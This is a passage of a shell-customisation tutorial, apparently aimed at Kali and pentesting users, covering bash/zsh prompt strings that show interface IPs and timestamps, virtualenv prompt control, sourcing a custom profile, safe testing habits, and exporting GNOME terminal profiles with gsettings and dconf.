+<div class="highlight"><pre><span></span><code>┌──(kali㉿kali)-[tun0:10.10.20.151/24]-[2024-04-10•11:22:33]-[~/Documents]
+└─$
+</code></pre></div>
+<p>These pieces create the above <code>.zshrc</code> prompt string:</p>
+<ul>
+<li>The <code>%b%F{%(#.magent.magenta)}</code> strings are where you can modify colors</li>
+<li>In Kali's <code>.zshrc</code> file, some color terminology is listed below in the <code>ZSH_HIGHLIGHT_STYLES</code> variables</li>
+<li>The <code>get_net_info()</code> function is written just above <code>configure_prompt()</code> in Kail's <code>.zshrc</code>, it obtains the IP information based on available interfaces</li>
+<li><code>20%D</code> in <code>zsh</code> prints <code>20YY</code> where <code>%D</code> is two digits (instead of YY) for the current year</li>
+<li><code>%*</code> in <code>zsh</code> prints the current time as <code>hh:mm:ss</code>, this expression is separated from the next by single quotes plus the <code>$</code> sign like this: <code>%*'$'&lt;next-expression...&gt;</code></li>
+<li>The values update automatically each time you press enter</li>
+</ul>
+<p><em>NOTE: Your function or command substitution needs to be within a string enclosed by one of the single quotes <code>'</code> to be called every time you press enter. This is easy to misunderstand, as normally <code>bash</code> requires double quotes to interpret anything within quoted strings. Thanks to user gubarz in the HackTheBox Discord for pointing this out.</em></p>
+<p>Kali prompt string example:</p>
+<ul>
+<li>https://www.shellcheck.net/wiki/SC2155</li>
+</ul>
+<div class="highlight"><pre><span></span><code>&lt;SNIP&gt;
+get_net_info<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+&lt;SNIP&gt;
+
+<span class="nv">PROMPT</span><span class="o">=</span><span class="s1">$&#39;%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n&#39;</span><span class="nv">$prompt_symbol</span><span class="s1">$&#39;%m%b%F{%(#.blue.green)})-[%b%F{%(#.magenta.magenta)}$(get_net_info)%b%F{%(#.blue.green)}]-[%b%F{%(#.yellow.yellow)}20%D%b%F{%(#.blue.green)}•%b%F{%(#.yellow.yellow)}%*&#39;$&#39;%b%F{%(#.blue.green)}]-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} &#39;</span>
+&lt;SNIP&gt;
+</code></pre></div>
+<h3 id="controlling-venv">Controlling (venv)</h3>
+<p>You can modify where and how the virtual environment string gets added to your shell (specifically for python in this case, but the same idea applies to other shell modifiers).</p>
+<p><a href="https://stackoverflow.com/questions/10406926/how-do-i-change-the-default-virtualenv-prompt">If you review the <code>.../bin/activate</code> file of a python virtual environment, you'll see how it works, and how you can modify its behavior</a>.</p>
+<div class="admonition quote">
+<p class="admonition-title">Python Virtual Environment Dotfile Snippet</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># SNIP</span>
+
+<span class="nv">VIRTUAL_ENV</span><span class="o">=</span>/home/user1/venv
+<span class="nb">export</span><span class="w"> </span>VIRTUAL_ENV
+
+<span class="nv">_OLD_VIRTUAL_PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PATH</span><span class="s2">&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$VIRTUAL_ENV</span><span class="s2">/&quot;</span>bin<span class="s2">&quot;:</span><span class="nv">$PATH</span><span class="s2">&quot;</span>
+<span class="nb">export</span><span class="w"> </span>PATH
+
+<span class="c1"># unset PYTHONHOME if set</span>
+<span class="c1"># this will fail if PYTHONHOME is set to the empty string (which is bad anyway)</span>
+<span class="c1"># could use `if (set -u; : $PYTHONHOME) ;` in bash</span>
+<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PYTHONHOME</span><span class="k">:-</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span><span class="nv">_OLD_VIRTUAL_PYTHONHOME</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PYTHONHOME</span><span class="k">:-</span><span class="si">}</span><span class="s2">&quot;</span>
+<span class="w">    </span><span class="nb">unset</span><span class="w"> </span>PYTHONHOME
+<span class="k">fi</span>
+
+<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-z<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">VIRTUAL_ENV_DISABLE_PROMPT</span><span class="k">:-</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span><span class="nv">_OLD_VIRTUAL_PS1</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PS1</span><span class="k">:-</span><span class="si">}</span><span class="s2">&quot;</span>
+<span class="w">    </span><span class="nv">PS1</span><span class="o">=</span><span class="s1">&#39;(venv) &#39;</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">PS1</span><span class="k">:-</span><span class="si">}</span><span class="s2">&quot;</span>
+<span class="w">    </span><span class="nb">export</span><span class="w"> </span>PS1
+<span class="w">    </span><span class="nv">VIRTUAL_ENV_PROMPT</span><span class="o">=</span><span class="s1">&#39;(venv) &#39;</span>
+<span class="w">    </span><span class="nb">export</span><span class="w"> </span>VIRTUAL_ENV_PROMPT
+<span class="k">fi</span>
+
+<span class="c1"># SNIP</span>
+</code></pre></div>
+<p>That <code>VIRTUAL_ENV_DISABLE_PROMPT</code> is a variable we can set so we can handle how and where the <code>(venv)</code> string gets added to our prompt.</p>
+</div>
+<p>Here's how we can achieve this:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># This will add (venv) to the front of the prompt anytime it&#39;s activated</span>
+<span class="c1"># SNIP</span>
+
+<span class="nb">export</span><span class="w"> </span><span class="nv">VIRTUAL_ENV_DISABLE_PROMPT</span><span class="o">=</span><span class="m">1</span>
+
+venv_prompt<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="c1"># This is for modifying python virtual evnrionments</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">VIRTUAL_ENV</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;(venv) &quot;</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="o">}</span>
+
+<span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot; ... \\</span>$<span class="s2"> \$(venv_prompt)&quot;</span>
+
+<span class="c1"># SNIP</span>
+</code></pre></div>
+<p>Here's what this could look like, if for instance you have a multiline shell prompt:</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">[</span><span class="n">user</span><span class="nd">@fedora</span><span class="p">:</span><span class="mi">1</span><span class="p">]</span> <span class="err">•</span> <span class="p">(</span><span class="o">/</span><span class="n">tmp</span><span class="p">])</span>
+<span class="err">└─$</span> <span class="p">(</span><span class="n">venv</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="making-the-changes">Making the Changes</h3>
+<p>Putting the above network functions, color variables, and shell escape characters together into a shell profile can be accomplished with minimal mess by writing all of these modifications to a single file, and dot sourcing it. This is ideal over trying to manually edit the <code>~/.bashrc</code> or shell profiles that ship with your OS, as the code there can be unreadable and hard to work with if you're not familiar with how <code>bash</code> or <code>zsh</code> work.</p>
+<p>For example, take the following code block containing our shell modifications:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+<span class="c1"># GPL-3.0-or-later</span>
+
+<span class="c1"># shellcheck disable=SC2034</span>
+<span class="c1"># shellcheck disable=SC2116</span>
+<span class="c1"># shellcheck disable=SC2086</span>
+
+<span class="c1"># References:</span>
+<span class="c1"># - [GNU Bash Manual: Shell Variables](https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables-1)</span>
+<span class="c1"># - [GNU Bash Manual: Controlling the Prompt String](https://www.gnu.org/software/bash/manual/bash.html#Controlling-the-Prompt-1)</span>
+<span class="c1"># - [Kali Linux Blog: Shell Prompt Change](https://www.kali.org/blog/kali-linux-2022-1-release/#shell-prompt-changes)</span>
+<span class="c1"># - [TrustedSec: Shell Improvements for Pentesters](https://www.trustedsec.com/blog/workflow-improvements-for-pentesters/)</span>
+<span class="c1"># - [ohmyzsh: Themes](https://github.com/ohmyzsh/ohmyzsh/wiki/Themes)</span>
+<span class="c1"># - [github.com/carlospolop: Shell Prompt Gist](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)</span>
+<span class="c1"># - [Stack Overflow: Shell Prompt with Datetime](https://stackoverflow.com/questions/61335641/bash-or-z-shell-terminal-prompt-with-time-and-date)</span>
+<span class="c1"># - [Super User: Display IP in Shell Prompt](https://superuser.com/questions/668174/how-can-you-display-host-ip-address-in-bash-prompt)</span>
+<span class="c1"># - [Stack Exchange: Print Last Element of Each Row](https://unix.stackexchange.com/questions/145672/print-last-element-of-each-row)</span>
+<span class="c1"># - [Arch Linux Wiki: GNOME Configuration](https://wiki.archlinux.org/title/GNOME#Configuration)</span>
+<span class="c1"># - [Arch Linux Wiki: Prompt Customization](https://wiki.archlinux.org/title/Bash/Prompt_customization#Embedding_commands)</span>
+<span class="c1"># - [Ask Ubuntu: Backup GNOME Terminal Settings](https://askubuntu.com/questions/967517/how-to-backup-gnome-terminal-emulator-settings)</span>
+<span class="c1"># - [Stack Exchange: How the Escape `\` Character Works in Bash](https://unix.stackexchange.com/questions/611419/how-does-the-escape-character-work-in-bash-prompt)</span>
+<span class="c1"># - [Stack Overflow: How Do I Change the `virtualenv` Prompt?](https://stackoverflow.com/questions/10406926/how-do-i-change-the-default-virtualenv-prompt)</span>
+<span class="c1"># - [TCM-SEC Academy: Linux 101](https://academy.tcm-sec.com/p/linux-101)</span>
+<span class="c1"># - [Antisyphon Training: Regular Expressions with Joff Thyer](https://www.antisyphontraining.com/regular-expressions-your-new-lifestyle-w-joff-thyer/)</span>
+
+<span class="c1"># Colors and color printing code taken directly from:</span>
+<span class="c1"># https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/builder/linpeas_parts/linpeas_base.sh</span>
+<span class="nv">C</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\033&#39;</span><span class="k">)</span>
+<span class="nv">RED</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;31m&quot;</span>
+<span class="nv">GREEN</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;32m&quot;</span>
+<span class="nv">YELLOW</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;33m&quot;</span>
+<span class="nv">RED_YELLOW</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;31;103m&quot;</span>
+<span class="nv">BLUE</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;34m&quot;</span>
+<span class="nv">ITALIC_BLUE</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;34m</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[3m&quot;</span>
+<span class="nv">LIGHT_MAGENTA</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;95m&quot;</span>
+<span class="nv">LIGHT_CYAN</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;96m&quot;</span>
+<span class="nv">LG</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;37m&quot;</span><span class="w"> </span><span class="c1">#LightGray</span>
+<span class="nv">DG</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[1;90m&quot;</span><span class="w"> </span><span class="c1">#DarkGray</span>
+<span class="nv">NC</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[0m&quot;</span>
+<span class="nv">UNDERLINED</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[5m&quot;</span>
+<span class="nv">ITALIC</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">C</span><span class="si">}</span><span class="s2">[3m&quot;</span>
+
+<span class="c1"># Shell variables</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PROMPT_DIRTRIM</span><span class="o">=</span><span class="m">1</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">VIRTUAL_ENV_DISABLE_PROMPT</span><span class="o">=</span><span class="m">1</span>
+
+<span class="nv">interface_list</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>link<span class="w"> </span>show<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;: &#39;</span><span class="w"> </span><span class="s1">&#39;{</span>
+<span class="s1">    if ($0 !~ /state DOWN/ &amp;&amp; $2 ~ /[a-z]+[0-9]/) {</span>
+<span class="s1">        interfaces[NR] = $2</span>
+<span class="s1">    }</span>
+<span class="s1">}</span>
+<span class="s1">END{</span>
+<span class="s1">    for(i in interfaces){</span>
+<span class="s1">        if (interfaces[i] ~ /^tun|^tap/) {</span>
+<span class="s1">            printf interfaces[i] &quot; &quot;</span>
+<span class="s1">        } else if (interfaces[i] ~ /^wg[0-9]/) {</span>
+<span class="s1">            printf interfaces[i] &quot; &quot;</span>
+<span class="s1">        } else if (interfaces[i] ~ /^en/) {</span>
+<span class="s1">            printf interfaces[i] &quot; &quot;</span>
+<span class="s1">        } else if (interfaces[i] ~ /^eth/) {</span>
+<span class="s1">            printf interfaces[i] &quot; &quot;</span>
+<span class="s1">        } else if (interfaces[i] ~ /^wl[a-z0-9]+$|^ath[0-9]/) {</span>
+<span class="s1">            printf interfaces[i] &quot; &quot;</span>
+<span class="s1">        }</span>
+<span class="s1">    }</span>
+<span class="s1">}&#39;</span><span class="k">)</span>
+
+get_net_info<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="c1"># Replace `$(echo $interface_list)` with a specific interface name or list of names if needed (e.g. `tun0 eth0`)</span>
+<span class="w">    </span><span class="c1">#for interface in eth0; do</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span>interface<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="nv">$interface_list</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">        </span><span class="c1"># The `NR==1{&lt;SNIP&gt;; exit}` in awk at the end of the next line only prints the first IP, for interfaces with multipe IPs</span>
+<span class="w">        </span><span class="c1"># http://stackoverflow.com/questions/22190902/ddg#22190928</span>
+<span class="w">        </span><span class="nv">IFACE_NAME</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>dev<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$interface</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;inet\s.+</span><span class="nv">$interface</span>$<span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;NR==1{print $NF; exit}&#39;</span><span class="k">)</span>
+<span class="w">        </span><span class="nv">IFACE_ADDR</span><span class="o">=</span><span class="k">$(</span>ip<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>dev<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$interface</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-P<span class="w"> </span><span class="s2">&quot;inet\s.+</span><span class="nv">$interface</span>$<span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;NR==1{print $2; exit}&#39;</span><span class="k">)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">IFACE_NAME</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">IFACE_ADDR</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">            </span><span class="c1"># The &quot;${NC}:${YELLOW}&quot; is being passed to and interpretted by this script in your shell, it resets the color of the `:` symbol</span>
+<span class="w">            </span><span class="c1"># using the ANSI colors defined above.</span>
+<span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">IFACE_NAME</span><span class="si">}${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">YELLOW</span><span class="si">}${</span><span class="nv">IFACE_ADDR</span><span class="si">}</span><span class="s2">&quot;</span>
+<span class="w">            </span><span class="k">return</span>
+<span class="w">        </span><span class="k">fi</span>
+<span class="w">    </span><span class="k">done</span>
+<span class="o">}</span>
+
+get_timezone<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="c1"># This will get the timezone set such as &quot;UTC&quot; for use in the PS1 string</span>
+<span class="w">    </span>date<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $6}&#39;</span>
+<span class="o">}</span>
+
+venv_prompt<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="c1"># This is for modifying python virtual evnrionments</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-n<span class="w"> </span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">VIRTUAL_ENV</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;(venv) &quot;</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="o">}</span>
+
+<span class="c1"># Plain text prompt string</span>
+<span class="c1">#if [ &quot;$PS1&quot; ]; then</span>
+<span class="c1">#    PS1=&quot;┌──[\u@\h:\l]-[\D{%Y-%m-%d}•\t]-[\$(get_net_info)]-[ \W]\n└─\\$ &quot;</span>
+<span class="c1">#fi</span>
+
+<span class="c1"># Color prompt string using brackets</span>
+<span class="c1">#if [ &quot;$PS1&quot; ]; then</span>
+<span class="c1">#    PS1=&quot;┌──[${GREEN}\u${NC}@${GREEN}\h${NC}:${LIGHT_MAGENTA}\l${NC}]-[${LIGHT_CYAN}\D{%Y-%m-%d}${NC}•${LIGHT_CYAN}\t${NC}]-[${YELLOW}\$(get_net_info)${NC}]-[${GREEN}\w${NC}]\n└─\\$ &quot;</span>
+<span class="c1">#fi</span>
+
+<span class="c1"># Color prompt string without brackets</span>
+<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PS1</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;┌──/</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">\u</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">@</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">\h</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">LIGHT_MAGENTA</span><span class="si">}</span><span class="s2">\l</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">/ </span><span class="si">${</span><span class="nv">LIGHT_CYAN</span><span class="si">}</span><span class="s2">\D{%Y%m%d%H%M%S}</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">\$(get_timezone) </span><span class="si">${</span><span class="nv">YELLOW</span><span class="si">}</span><span class="s2">\$(get_net_info)</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2"> (</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">\w</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">)\n└─\\</span>$<span class="s2"> \$(venv_prompt)&quot;</span>
+<span class="k">fi</span>
+</code></pre></div>
+<p>Write all of it to one of the following paths:</p>
+<ul>
+<li><code>/etc/profile.d/custom_shell.sh</code></li>
+<li><code>~/.custom_shell.sh</code></li>
+</ul>
+<p>Ensure it's being dot sourced by your <code>~/.bashrc</code> file. For example, on Fedora, just writing the modifications to <code>/etc/profile.d/custom_shell.sh</code> and opening a new shell session is enough. On Ubuntu, add the following line to your <code>~/.bashrc</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-f<span class="w"> </span>~/.custom_shell.sh<span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span>.<span class="w"> </span>~/.custom_shell.sh
+<span class="k">fi</span>
+</code></pre></div>
+<p>This will source that file, loading it into your shell. The above example effectively overwrites your default <code>PS1</code> shell prompt variable.</p>
+<hr />
+<h2 id="testing-changes">Testing Changes</h2>
+<p><strong>Modifying your shell can completely break your system.</strong> It's important to test anything in a sandbox, VM, or temporary cloud environment. The following steps make it easy to recover should anything go wrong. This way you aren't repeatedly restoring snapshots or reprovisioning your VM.</p>
+<ul>
+<li>Always have two sessions open</li>
+<li>Backup any files you're modifying <code>cp ~/.bashrc ~/.bashrc.bkup</code></li>
+<li>One session stays open and never loads the modifications into its shell</li>
+<li>One session is used to dot source or load changes and test them out</li>
+<li>If anything breaks, kill the broken session and undo the breaking changes with your functioning session</li>
+</ul>
+<hr />
+<h2 id="aliases">Aliases</h2>
+<p>It's also worth including some examples for aliases. Use these for sets of commands you execute regularly:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># custom aliases</span>
+<span class="nb">alias</span><span class="w"> </span><span class="nv">c</span><span class="o">=</span><span class="s1">&#39;clear&#39;</span>
+<span class="nb">alias</span><span class="w"> </span><span class="nv">dualshark</span><span class="o">=</span><span class="s1">&#39;wireshark&amp; wireshark&amp;&#39;</span>
+</code></pre></div>
+<hr />
+<h2 id="export-and-import-shell-profiles-gnome">Export and Import Shell Profiles (GNOME)</h2>
+<p>On GNOME you can use <code>gsettings</code> and <code>dconf</code> to enumerate your terminal settings. This is useful when you customize your shell settings or want to apply profiles to other machines in a repeatable way. This isn't limited to terminal settings either, it's an effective way to backup and restore GNOME system configurations in general.</p>
+<ul>
+<li><a href="https://wiki.archlinux.org/title/GNOME#Configuration">Arch Linux Wiki: GNOME Configuration</a></li>
+<li><a href="https://askubuntu.com/questions/967517/how-to-backup-gnome-terminal-emulator-settings">Ask Ubuntu: Backup GNOME Terminal Settings</a></li>
+</ul>
+<div class="admonition note">
+<p class="admonition-title"><code>dconf</code> vs <code>gsettings</code></p>
+<p><code>dconf</code> is the ideal way to manage applying settings system-wide through automation. However, some settings are only readable through <code>gsettings</code>, meaning you'll need to enumerate them there, then translate them to be in a format to work with <code>dconf</code>. This is tricky at first but becomes easier to do over time.</p>
+</div>
+<p>The GNOME terminal settings seem to be split into two pieces; the settings themselves for each profile, and the actual list of profile ID's that makes them populate your settings tab in the GUI. Here is where <code>dconf</code> is unable to "see" the lists by default in most cases, but <code>gsettings</code> can.</p>
+<p>First, obtain the current profiles in your shell settings:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Tab complete this to reveal &quot;list&quot; and &quot;default&quot; as the only keys</span>
+$<span class="w"> </span>gsettings<span class="w"> </span>get<span class="w"> </span>org.gnome.Terminal.ProfilesList
+default<span class="w">  </span>list
+
+<span class="c1"># Dump both, you may end up with something like this</span>
+gsettings<span class="w"> </span>get<span class="w"> </span>org.gnome.Terminal.ProfilesList<span class="w"> </span>list
+<span class="o">[</span><span class="s1">&#39;b1dcc9dd-5262-4d8d-a863-c897e6d979b9&#39;</span><span class="o">]</span>
+gsettings<span class="w"> </span>get<span class="w"> </span>org.gnome.Terminal.ProfilesList<span class="w"> </span>default
+<span class="s1">&#39;b1dcc9dd-5262-4d8d-a863-c897e6d979b9&#39;</span>
+</code></pre></div>
+<p>Next, create the backup file of <em>all</em> terminal settings:</p>
+<div class="highlight"><pre><span></span><code>dconf<span class="w"> </span>dump<span class="w"> </span>/org/gnome/terminal/<span class="w"> </span>&gt;<span class="w"> </span>gnome-terminal-settings.dconf
+</code></pre></div>
+<p>You may end up with something like this:</p>
+<div class="highlight"><pre><span></span><code>[legacy/profiles:/:b1dcc9dd-5262-4d8d-a863-c897e6d979b9]
+background-color=&#39;rgb(0,0,0)&#39;
+foreground-color=&#39;rgb(0,255,0)&#39;
+palette=[&#39;rgb(23,20,33)&#39;, &#39;rgb(192,28,40)&#39;, &#39;rgb(38,162,105)&#39;, &#39;rgb(162,115,76)&#39;, &#39;rgb(18,72,139)&#39;, &#39;rgb(163,71,186)&#39;, &#39;rgb(42,161,179)&#39;, &#39;rgb(208,207,204)&#39;, &#39;rgb(94,92,100)&#39;, &#39;rgb(246,97,81)&#39;, &#39;rgb(51,209,122)&#39;, &#39;rgb(233,173,12)&#39;, &#39;rgb(42,123,222)&#39;, &#39;rgb(192,97,203)&#39;, &#39;rgb(51,199,222)&#39;, &#39;rgb(255,255,255)&#39;]
+use-theme-colors=false
+use-theme-transparency=false
+
+[legacy/profiles:/:2da83008-7288-437f-ab56-0e6052283371]
+background-color=&#39;rgb(46,52,54)&#39;
+foreground-color=&#39;rgb(211,215,207)&#39;
+palette=[&#39;rgb(23,20,33)&#39;, &#39;rgb(192,28,40)&#39;, &#39;rgb(38,162,105)&#39;, &#39;rgb(162,115,76)&#39;, &#39;rgb(18,72,139)&#39;, &#39;rgb(163,71,186)&#39;, &#39;rgb(42,161,179)&#39;, &#39;rgb(208,207,204)&#39;, &#39;rgb(94,92,100)&#39;, &#39;rgb(246,97,81)&#39;, &#39;rgb(51,209,122)&#39;, &#39;rgb(233,173,12)&#39;, &#39;rgb(42,123,222)&#39;, &#39;rgb(192,97,203)&#39;, &#39;rgb(51,199,222)&#39;, &#39;rgb(255,255,255)&#39;]
+use-theme-colors=false
+use-theme-transparency=false
+visible-name=&#39;My Custom Profile&#39;
+</code></pre></div>
+<p>What's missing are <mark>the two keys we obtained using <code>gsettings</code> for the profile list and which profile is set to be the default</mark>.</p>
+<div class="admonition tip">
+<p class="admonition-title"><code>dconf-editor</code></p>
+<p>You can also find these paths using <code>dconf-editor</code> on Ubuntu, which will note anything that's been changed from its default value.</p>
+</div>
+<p>Whether you used <code>dconf-editor</code> or wrote this manually based on the <code>gsettings</code> output, here's what a full block would look like:</p>
+<div class="highlight"><pre><span></span><code>[legacy/profiles:]
+default=&#39;b1dcc9dd-5262-4d8d-a863-c897e6d979b9&#39;
+list=[&#39;b1dcc9dd-5262-4d8d-a863-c897e6d979b9&#39;, &#39;2da83008-7288-437f-ab56-0e6052283371&#39;]
+
+[legacy/profiles:/:b1dcc9dd-5262-4d8d-a863-c897e6d979b9]
+background-color=&#39;rgb(0,0,0)&#39;
+foreground-color=&#39;rgb(0,255,0)&#39;
+palette=[&#39;rgb(23,20,33)&#39;, &#39;rgb(192,28,40)&#39;, &#39;rgb(38,162,105)&#39;, &#39;rgb(162,115,76)&#39;, &#39;rgb(18,72,139)&#39;, &#39;rgb(163,71,186)&#39;, &#39;rgb(42,161,179)&#39;, &#39;rgb(208,207,204)&#39;, &#39;rgb(94,92,100)&#39;, &#39;rgb(246,97,81)&#39;, &#39;rgb(51,209,122)&#39;, &#39;rgb(233,173,12)&#39;, &#39;rgb(42,123,222)&#39;, &#39;rgb(192,97,203)&#39;, &#39;rgb(51,199,222)&#39;, &#39;rgb(255,255,255)&#39;]
+use-theme-colors=false
+use-theme-transparency=false
+
+[legacy/profiles:/:2da83008-7288-437f-ab56-0e6052283371]
+background-color=&#39;rgb(46,52,54)&#39;
+foreground-color=&#39;rgb(211,215,207)&#39;
